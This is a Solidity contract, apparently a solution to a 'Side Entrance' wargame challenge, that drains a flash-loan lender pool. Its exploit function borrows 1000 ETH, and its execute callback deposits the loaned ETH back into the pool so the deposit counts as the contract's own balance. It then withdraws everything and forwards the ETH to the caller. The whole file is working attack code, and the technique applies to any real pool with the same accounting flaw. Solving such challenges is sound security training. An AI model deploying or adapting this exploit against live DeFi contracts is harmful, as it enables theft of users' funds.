// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solady/src/utils/SafeTransferLib.sol";
import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceExploit
 * @author scorpion9979
 */
contract SideEntranceExploit is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public immutable pool;

    constructor(SideEntranceLenderPool pool_) {
        pool = pool_;
    }

    function execute() external payable {
        // Use loan as deposit and send back all ETH to pool
        // This is important to set our balance in SideEntranceLenderPool to 1000 ETH
        SideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function exploit() external payable {
        // take a loan of 1000 ETH
        pool.flashLoan(1000 ether);
        // withdraw our full ETH balance from SideEntranceLenderPool
        pool.withdraw();
        // Transfer all ETH to the calling EOA
        SafeTransferLib.safeTransferETH(msg.sender, 1000 ether);
    }

    // Allow deposits of ETH
    receive() external payable {}
}
